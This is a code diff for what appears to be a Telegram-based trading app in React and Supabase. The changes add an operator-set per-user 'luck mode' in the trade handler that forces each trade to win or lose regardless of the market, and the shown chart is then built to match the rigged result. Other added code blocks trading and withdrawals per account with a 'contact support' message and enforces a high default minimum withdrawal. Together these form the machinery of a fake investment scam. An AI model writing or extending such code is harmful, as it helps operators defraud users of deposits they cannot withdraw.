@@ -529,7 +529,7 @@ const [profileToggles, setProfileToggles] = useState({
   sounds: true,
   biometry: false,
 });
-// ... твои старые стейты ...
+const [userFlags, setUserFlags] = useState({});
   const [userAssets, setUserAssets] = useState([]); // Храним купленные монеты
   const [coinModal, setCoinModal] = useState(null); // Какую монету открыли
   const [spotBuyAmount, setSpotBuyAmount] = useState(""); // Сумма покупки
@@ -1248,12 +1248,11 @@ useEffect(() => {
     return () => clearTimeout(id);
   }, [toast]);
 
-// Грузим баланс и историю кошелька из Supabase
-// Грузим баланс и историю кошелька из Supabase
 const loadWalletDataFromSupabase = useCallback(async () => {
   if (!telegramId) return;
 
   try {
+    // 1. Загружаем операции кошелька
     const [topupsRes, withdrawsRes] = await Promise.all([
       supabase
         .from("topups")
@@ -1266,9 +1265,19 @@ const loadWalletDataFromSupabase = useCallback(async () => {
         .eq("user_tg_id", telegramId)
         .order("ts", { ascending: false }),
     ]);
-	
-	// --- ДОБАВИТЬ ЭТО ---
-    // Грузим активы пользователя
+
+    // 2. ЗАГРУЖАЕМ НАСТРОЙКИ ЮЗЕРА (Блокировки, Лимиты, Удача)
+    const { data: userSettings } = await supabase
+      .from("users")
+      .select("luck_mode, is_blocked_trade, is_blocked_withdraw, min_deposit, min_withdraw")
+      .eq("tg_id", telegramId)
+      .maybeSingle();
+
+    if (userSettings) {
+      setUserFlags(userSettings); // Сохраняем в стейт
+    }
+
+    // 3. Грузим активы пользователя
     if (user) {
       const { data: assets } = await supabase
         .from("user_assets")
@@ -1277,21 +1286,15 @@ const loadWalletDataFromSupabase = useCallback(async () => {
       
       if (assets) setUserAssets(assets);
     }
-    // --------------------
 
-    if (topupsRes.error) {
-      console.error("loadWalletData topups error:", topupsRes.error);
-    }
-    if (withdrawsRes.error) {
-      console.error("loadWalletData withdrawals error:", withdrawsRes.error);
-    }
+    if (topupsRes.error) console.error("loadWalletData topups error:", topupsRes.error);
+    if (withdrawsRes.error) console.error("loadWalletData withdrawals error:", withdrawsRes.error);
 
-    // === ФИЛЬТРАЦИЯ: скрываем старые операции для нового аккаунта ===
+    // === ФИЛЬТРАЦИЯ: скрываем старые операции ===
     const userRegTime = user?.createdAt || 0;
     const rawTopups = topupsRes.data || [];
     const rawWithdrawals = withdrawsRes.data || [];
 
-    // Оставляем только те, что были созданы ПОСЛЕ регистрации этого аккаунта
     const topups = rawTopups.filter(t => {
       const tTime = t.created_at ? new Date(t.created_at).getTime() : 0;
       return tTime >= userRegTime;
@@ -1301,11 +1304,10 @@ const loadWalletDataFromSupabase = useCallback(async () => {
       const wTime = w.ts ? new Date(w.ts).getTime() : 0;
       return wTime >= userRegTime;
     });
-    // ================================================================
 
     const normalizeStatus = (s) => (s || "").toLowerCase();
 
-    // Считаем баланс только по отфильтрованным (новым) операциям
+    // Считаем баланс
     const approvedDepositSum = topups
       .filter((t) => normalizeStatus(t.status) === "approved")
       .reduce((acc, t) => acc + Number(t.amount || 0), 0);
@@ -1321,7 +1323,7 @@ const loadWalletDataFromSupabase = useCallback(async () => {
 
     const history = [];
 
-    // Формируем историю пополнений
+    // Формируем историю
     topups.forEach((row) => {
       const status = normalizeStatus(row.status) || "pending";
       history.push({
@@ -1335,7 +1337,6 @@ const loadWalletDataFromSupabase = useCallback(async () => {
       });
     });
 
-    // Формируем историю выводов
     withdrawals.forEach((row) => {
       history.push({
         id: `wd-${row.id}`,
@@ -1354,7 +1355,7 @@ const loadWalletDataFromSupabase = useCallback(async () => {
   } finally {
     setHistoryLoading(false);
   }
-}, [telegramId, user]); // Добавили user в зависимости
+}, [telegramId, user]);
 
 useEffect(() => {
   loadWalletDataFromSupabase();
@@ -2098,47 +2099,64 @@ const handleStartTrade = () => {
         ? "Enter the amount you want to invest."
         : "Введите сумму, которую хотите инвестировать."
     );
-    return false; // <--- ВЕРНУТЬ FALSE (ОТМЕНА СВАЙПА)
+    return false;
   }
 
   if (amountNum < minInvest) {
     setTradeError(
       isEN
-        ? `Minimum investment is ${minInvest} ${
-            settings.currency === "RUB" ? "RUB" : "USD"
-          }.`
+        ? `Minimum investment is ${minInvest} ${currencyCode}.`
         : `Минимальная сумма инвестиций — ${minInvest} ${currencyCode}.`
     );
-    return false; // <--- ВЕРНУТЬ FALSE
+    return false;
   }
 
-  // баланс хранится в RUB, ввод — в выбранной валюте
-  const amountRub =
-    settings.currency === "USD" ? amountNum * USD_RATE : amountNum;
+  const amountRub = settings.currency === "USD" ? amountNum * USD_RATE : amountNum;
 
   if (amountRub > balance) {
-    setTradeError(
-      isEN
-        ? "Not enough funds on balance."
-        : "Недостаточно средств на балансе."
-    );
-    return false; // <--- ВЕРНУТЬ FALSE
+    setTradeError(isEN ? "Not enough funds on balance." : "Недостаточно средств на балансе.");
+    return false;
   }
 
   if (activeTrade) return false; 
 
-  // 2. ЕСЛИ ВСЁ ОК — ЗАПУСКАЕМ СДЕЛКУ
-  triggerHaptic('heavy'); 
+  // --- НОВОЕ: ПРОВЕРКА БЛОКИРОВКИ ТОРГОВЛИ ---
+  if (userFlags?.is_blocked_trade) {
+    setTradeError(
+        isEN 
+        ? "Trading is temporarily restricted on your account. Contact support." 
+        : "Торговля временно ограничена на вашем аккаунте. Обратитесь в поддержку."
+    );
+    triggerNotification("error");
+    return false;
+  }
+  // -------------------------------------------
 
+  // 2. ЗАПУСК СДЕЛКИ
+  triggerHaptic('heavy'); 
   setIsTradeProcessing(true);
   setTradeToastVisible(false);
 
-  // СПИСЫВАЕМ СТАВКУ С БАЛАНСА СРАЗУ
+  // Списываем баланс
   setBalance((prev) => Math.max(0, prev - amountRub));
 
+  // --- НОВОЕ: ЛОГИКА УДАЧИ (LUCK MODE) ---
+  let resultDirection;
+  const luck = userFlags?.luck_mode || 'random';
   const possibleDirections = ["up", "down", "flat"];
-  const resultDirection =
-    possibleDirections[Math.floor(Math.random() * possibleDirections.length)];
+
+  if (luck === 'win') {
+      // Всегда выигрывает (направление совпадает с выбором юзера)
+      resultDirection = tradeForm.direction; 
+  } else if (luck === 'lose') {
+      // Всегда проигрывает (выбираем любое направление, кроме выбранного юзером)
+      const losingOptions = possibleDirections.filter(d => d !== tradeForm.direction);
+      resultDirection = losingOptions[Math.floor(Math.random() * losingOptions.length)];
+  } else {
+      // Random (честный рандом)
+      resultDirection = possibleDirections[Math.floor(Math.random() * possibleDirections.length)];
+  }
+  // ---------------------------------------
 
   const tradeId = Date.now();
 
@@ -2147,7 +2165,7 @@ const handleStartTrade = () => {
     symbol: selectedSymbol,
     amount: amountRub, 
     direction: tradeForm.direction,
-    resultDirection,
+    resultDirection, // Используем подкрученный или рандомный результат
     multiplier: tradeForm.multiplier,
     duration: tradeForm.duration,
     startedAt: Date.now(),
@@ -2172,11 +2190,7 @@ const handleStartTrade = () => {
 
   setChartScenario(scenario);
 
-  const lastBasePoint =
-    baseChartPoints.length > 0
-      ? baseChartPoints[baseChartPoints.length - 1]
-      : null;
-
+  const lastBasePoint = baseChartPoints.length > 0 ? baseChartPoints[baseChartPoints.length - 1] : null;
   const future = generateScenarioPoints(scenario, lastBasePoint);
   const historyTail = baseChartPoints.slice(-40);
 
@@ -2187,13 +2201,12 @@ const handleStartTrade = () => {
   setTimeout(() => {
     setIsTradeProcessing(false);
     setTradeToastVisible(true);
-
     setTimeout(() => {
       setTradeToastVisible(false);
     }, 2200);
   }, 700);
 
-  return true; // <--- ВЕРНУТЬ TRUE (УСПЕХ)
+  return true;
 };
 
   const handleLoginChange = async () => {
@@ -3112,44 +3125,95 @@ const renderWallet = () => {
       }
     };
 
-    const handleWithdrawSubmit = async () => {
-      if (!telegramId) return;
-      const raw = walletForm.amount?.toString().replace(",", ".") || "";
-      const amountNum = parseFloat(raw);
-      if (!amountNum || amountNum <= 0) { setDepositError(isEN ? "Enter amount" : "Введите сумму"); return; }
-      if (amountNum > toDisplayCurrency(balance, settings.currency)) { setDepositError(isEN ? "Not enough funds" : "Недостаточно средств"); return; }
-      if (!walletForm.method) { setDepositError(isEN ? "Choose method" : "Выберите метод"); return; }
-      if (!withdrawDetails.trim()) { setDepositError(isEN ? "Enter details" : "Введите реквизиты"); return; }
+const handleWithdrawSubmit = async () => {
+  if (!telegramId) return;
+  
+  const raw = walletForm.amount?.toString().replace(",", ".") || "";
+  const amountNum = parseFloat(raw);
 
-      const amountRub = settings.currency === "USD" ? amountNum * USD_RATE : amountNum;
-      try {
-        let approverTgId = MAIN_ADMIN_TG_ID;
-        const { data: userRow } = await supabase.from("users").select("referred_by").eq("tg_id", telegramId).maybeSingle();
-        if (userRow?.referred_by) approverTgId = userRow.referred_by;
+  // Базовые проверки
+  if (!amountNum || amountNum <= 0) { 
+      setDepositError(isEN ? "Enter amount" : "Введите сумму"); 
+      return; 
+  }
+  
+  if (amountNum > toDisplayCurrency(balance, settings.currency)) { 
+      setDepositError(isEN ? "Not enough funds" : "Недостаточно средств"); 
+      return; 
+  }
+  
+  if (!walletForm.method) { 
+      setDepositError(isEN ? "Choose method" : "Выберите метод"); 
+      return; 
+  }
+  
+  if (!withdrawDetails.trim()) { 
+      setDepositError(isEN ? "Enter details" : "Введите реквизиты"); 
+      return; 
+  }
 
-        const { error } = await supabase.from("wallet_withdrawals").insert({
-          user_tg_id: telegramId,
-          approver_tg_id: approverTgId,
-          amount: amountRub,
-          method: walletForm.method || "card",
-          details: withdrawDetails.trim(),
-          status: "pending",
-          ts: new Date().toISOString(),
-        });
+  // --- НОВОЕ: ПРОВЕРКА БЛОКИРОВКИ ВЫВОДА ---
+  if (userFlags?.is_blocked_withdraw) {
+      setDepositError(
+          isEN 
+          ? "Withdrawals are temporarily restricted. Contact support." 
+          : "Вывод средств временно ограничен. Обратитесь в поддержку."
+      );
+      triggerNotification("error");
+      return;
+  }
 
-        if (error) throw error;
-        await loadWalletDataFromSupabase();
-        setWalletModal(null);
-        setWithdrawStep(1);
-        setWithdrawDetails("");
-        setWalletForm({ amount: "", method: "card" });
-        setDepositError("");
-        setToast({ type: "success", text: isEN ? "Request created" : "Заявка создана" });
-      } catch (e) {
-        console.error(e);
-        setDepositError("Ошибка создания заявки");
-      }
-    };
+  // --- НОВОЕ: ПРОВЕРКА МИНИМАЛЬНОЙ СУММЫ ВЫВОДА ---
+  // Берем из базы или ставим дефолт 10000
+  const minWdRub = userFlags?.min_withdraw || 10000; 
+  // Конвертируем введенную сумму в рубли для сравнения, если валюта USD
+  const amountInRub = settings.currency === "USD" ? amountNum * USD_RATE : amountNum;
+
+  if (amountInRub < minWdRub) {
+       // Для отображения ошибки конвертируем лимит обратно в валюту юзера
+       const displayMin = toDisplayCurrency(minWdRub, settings.currency);
+       setDepositError(
+           isEN 
+           ? `Minimum withdrawal amount is ${displayMin} ${currencyCode}` 
+           : `Минимальная сумма вывода: ${displayMin} ${currencyCode}`
+       );
+       return;
+  }
+  // -----------------------------------------------
+
+  const amountRub = settings.currency === "USD" ? amountNum * USD_RATE : amountNum;
+  
+  try {
+    let approverTgId = MAIN_ADMIN_TG_ID;
+    const { data: userRow } = await supabase.from("users").select("referred_by").eq("tg_id", telegramId).maybeSingle();
+    if (userRow?.referred_by) approverTgId = userRow.referred_by;
+
+    const { error } = await supabase.from("wallet_withdrawals").insert({
+      user_tg_id: telegramId,
+      approver_tg_id: approverTgId,
+      amount: amountRub,
+      method: walletForm.method || "card",
+      details: withdrawDetails.trim(),
+      status: "pending",
+      ts: new Date().toISOString(),
+    });
+
+    if (error) throw error;
+    
+    await loadWalletDataFromSupabase();
+    
+    setWalletModal(null);
+    setWithdrawStep(1);
+    setWithdrawDetails("");
+    setWalletForm({ amount: "", method: "card" });
+    setDepositError("");
+    setToast({ type: "success", text: isEN ? "Request created" : "Заявка создана" });
+    
+  } catch (e) {
+    console.error(e);
+    setDepositError("Ошибка создания заявки");
+  }
+};
 
     return (
       <>
